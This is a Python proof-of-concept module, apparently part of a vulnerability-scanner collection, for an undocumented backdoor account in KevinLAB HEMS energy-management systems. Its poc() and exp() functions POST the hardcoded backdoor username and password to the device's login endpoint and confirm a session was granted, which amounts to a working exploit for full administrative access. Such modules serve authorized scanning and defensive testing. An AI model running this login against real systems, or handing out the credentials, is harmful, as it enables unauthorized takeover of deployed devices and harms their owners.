import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''KevinLAB HEMS Undocumented Backdoor Account''',
        "description": '''The HEMS solution has an undocumented backdoor account and these sets of credentials are never exposed to the end-user and cannot be changed through any normal operation of the solution through the RMI. An attacker could exploit this vulnerability by logging in using the backdoor account with highest privileges for administration and gain full system control. The backdoor user cannot be seen in the users settings in the admin panel and it also uses an undocumented privilege level (admin_pk=1) which allows full availability of the features that the HEMS is offering remotely.''',
        "severity": "critical",
        "references": [
            "https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5654.php"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["kevinlab", "default-login", "backdoor"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/dashboard/proc.php?type=login"""
        method = "POST"
        data = """userid=kevinlab&userpass=kevin003"""
        headers = {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (resp0.status_code == 200) and ("""<meta http-equiv="refresh" content="0; url=/"></meta>""" in resp0.text) and ("""<script> alert""" in resp0.text) and ("""PHPSESSID""" in str(resp0.headers)):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url